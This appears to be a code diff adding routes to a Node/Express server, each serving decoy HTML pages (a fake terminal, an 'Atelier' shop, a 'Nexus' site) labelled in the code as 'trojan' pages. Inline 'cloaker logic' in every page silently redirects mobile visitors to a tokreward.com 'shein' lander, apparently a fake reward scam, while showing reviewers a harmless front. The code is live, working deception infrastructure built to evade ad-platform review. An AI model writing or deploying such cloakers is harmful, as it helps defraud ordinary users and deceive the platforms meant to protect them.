@@ -1334,6 +1334,135 @@ app.get('/9052/:slug', (req, res, next) => {
 });
 
 // SHEIN BH FLUENT
+app.get('/9053/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Courier New', monospace;
+        background-color: #000;
+        color: #0f0;
+        overflow: hidden;
+    }
+    .terminal {
+        height: 100vh;
+        overflow-y: auto;
+        padding: 20px;
+        box-sizing: border-box;
+    }
+    .cursor {
+        animation: blink 1s step-end infinite;
+    }
+    @keyframes blink {
+        50% { opacity: 0; }
+    }
+    .header {
+        font-size: 1.5em;
+        margin-bottom: 20px;
+    }
+    .content {
+        margin-bottom: 20px;
+    }
+    .menu {
+        margin-bottom: 20px;
+    }
+    .menu-item {
+        cursor: pointer;
+    }
+    .menu-item:hover {
+        text-decoration: underline;
+    }
+    .footer {
+        margin-top: 40px;
+        font-size: 0.8em;
+    }
+    a {
+        color: #0f0;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+<div class="terminal">
+    <div class="header">
+        <pre>
+ ____  ${slug} ____
+/ ___| _   _ ___| |_ ___ _ __ ___
+\___ \| | | / __| __/ _ \ '_ ` _ \
+ ___) | |_| \__ \ ||  __/ | | | | |
+|____/ \__, |___/\__\___|_| |_| |_|
+       |___/
+        </pre>
+        <p>Welcome to ${slug} System v1.0.0</p>
+    </div>
+
+    <div class="content">
+        <p>> Initializing ${slug} protocols...</p>
+        <p>> ${slug} core systems online.</p>
+        <p>> Enter command or select option:</p>
+    </div>
+
+    <div class="menu">
+        <p class="menu-item">> 1. Access ${slug} Database</p>
+        <p class="menu-item">> 2. Run ${slug} Diagnostics</p>
+        <p class="menu-item">> 3. Activate ${slug} Subsystems</p>
+        <p class="menu-item">> 4. Exit</p>
+    </div>
+
+    <div class="input">
+        > <span class="cursor">█</span>
+    </div>
+
+    <div class="footer">
+        <p>${slug} System &copy; 2024 | <a href="https://tokreward.com/pp.html">Privacy Protocol</a></p>
+    </div>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        const menuItems = document.querySelectorAll('.menu-item');
+        menuItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const response = document.createElement('p');
+                response.textContent = `> Executing ${item.textContent.slice(3)}...`;
+                item.parentNode.insertBefore(response, item.nextSibling);
+            });
+        });
+    });
+</script>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 905 Trojan (${slug})`);
+});
+
+
+// SHEIN BH FLUENT
 app.get('/876/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
@@ -1799,6 +1928,296 @@ app.get('/870/:slug', (req, res, next) => {
             res.send(trojanHTML);
             console.log(`Served 870 Trojan (${slug})`);
 });
+
+// SHEIN BH FLUENT
+app.get('/947/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Playfair Display', serif;
+        background-color: #f0e6d2;
+        color: #3a3a3a;
+    }
+    .scroll {
+        height: 100vh;
+        overflow-y: scroll;
+        scroll-snap-type: y mandatory;
+    }
+    section {
+        height: 100vh;
+        scroll-snap-align: start;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 2rem;
+        box-sizing: border-box;
+    }
+    .hero {
+        background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="50" height="50" fill="%23d4af37"/><rect x="50" y="50" width="50" height="50" fill="%23d4af37"/></svg>');
+        background-size: 20px 20px;
+    }
+    h1 {
+        font-size: 4rem;
+        margin-bottom: 1rem;
+        text-align: center;
+        color: #8b4513;
+    }
+    .shop-info {
+        font-size: 1.5rem;
+        margin-bottom: 2rem;
+        font-style: italic;
+    }
+    .features {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 2rem;
+    }
+    .feature {
+        background-color: #ffffff;
+        padding: 1.5rem;
+        border-radius: 10px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        transition: all 0.3s ease;
+        width: 250px;
+    }
+    .feature:hover {
+        transform: translateY(-10px);
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+    }
+    .feature h3 {
+        color: #8b4513;
+        margin-top: 0;
+    }
+    footer {
+        background-color: #3a3a3a;
+        color: #f0e6d2;
+        padding: 1rem;
+        text-align: center;
+    }
+    a {
+        color: #d4af37;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <div class="scroll">
+        <section class="hero">
+            <h1>${slug} Atelier</h1>
+            <div class="shop-info">Crafting wonders from: <strong>${slug}</strong></div>
+        </section>
+        
+        <section>
+            <h2>Our Masterpieces</h2>
+            <div class="features">
+                <div class="feature">
+                    <h3>Timeless Treasures</h3>
+                    <p>Heirlooms with stories to tell</p>
+                </div>
+                <div class="feature">
+                    <h3>Bespoke Creations</h3>
+                    <p>Tailored to your wildest dreams</p>
+                </div>
+                <div class="feature">
+                    <h3>Artisanal Wonders</h3>
+                    <p>Crafted with passion and precision</p>
+                </div>
+            </div>
+        </section>
+        
+        <section>
+            <h2>Visit Our Atelier</h2>
+            <p>Step into a world where creativity knows no bounds</p>
+            <p>Open by appointment only</p>
+        </section>
+        
+        <footer>
+            <p>Discover the art of ${slug} &copy; 2024 ${slug} Atelier | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/948/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Lato', sans-serif;
+        background-color: #1a1a1a;
+        color: #e0e0e0;
+    }
+    .container {
+        display: grid;
+        grid-template-columns: repeat(12, 1fr);
+        grid-auto-rows: minmax(100px, auto);
+        gap: 10px;
+        height: 100vh;
+        padding: 20px;
+        box-sizing: border-box;
+    }
+    .item {
+        background-color: #2a2a2a;
+        padding: 20px;
+        border-radius: 5px;
+        transition: all 0.3s ease;
+    }
+    .item:hover {
+        transform: scale(1.02);
+        box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+    }
+    .header {
+        grid-column: 1 / -1;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .title {
+        font-size: 2.5rem;
+        color: #00ffff;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+    }
+    .shop-info {
+        font-style: italic;
+    }
+    .main {
+        grid-column: 1 / span 8;
+        grid-row: 2 / span 2;
+    }
+    .sidebar {
+        grid-column: 9 / -1;
+        grid-row: 2 / span 2;
+    }
+    .feature {
+        grid-column: span 4;
+    }
+    .footer {
+        grid-column: 1 / -1;
+        text-align: center;
+    }
+    h2 {
+        color: #00ffff;
+        border-bottom: 1px solid #00ffff;
+        padding-bottom: 10px;
+    }
+    a {
+        color: #00ffff;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+    @media (max-width: 768px) {
+        .container {
+            grid-template-columns: 1fr;
+        }
+        .main, .sidebar, .feature {
+            grid-column: 1 / -1;
+        }
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <header class="item header">
+            <h1 class="title">${slug} Nexus</h1>
+            <div class="shop-info">Converging realities of <strong>${slug}</strong></div>
+        </header>
+        
+        <main class="item main">
+            <h2>Enter the Nexus</h2>
+            <p>Welcome to the intersection of imagination and reality. Here at ${slug} Nexus, we curate experiences that challenge your perception and expand your horizons.</p>
+        </main>
+        
+        <aside class="item sidebar">
+            <h2>Nexus Updates</h2>
+            <p>Stay tuned for our next reality-bending event. The boundaries of ${slug} are ever-expanding.</p>
+        </aside>
+        
+        <div class="item feature">
+            <h3>Reality Fragments</h3>
+            <p>Collect pieces of alternate worlds</p>
+        </div>
+        
+        <div class="item feature">
+            <h3>Paradox Puzzles</h3>
+            <p>Challenge your mind with impossible riddles</p>
+        </div>
+        
+        <div class="item feature">
+            <h3>Quantum Quests</h3>
+            <p>Embark on journeys across multiple realities</p>
+        </div>
+        
+        <footer class="item footer">
+            <p>Transcend the ordinary with ${slug} &copy; 2024 ${slug} Nexus | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 948 Trojan (${slug})`);
+});
+
+
+
+
+
 
 // DUDDV3 CLOAKER
 app.get('/duddv3/:slug', (req, res, next) => {
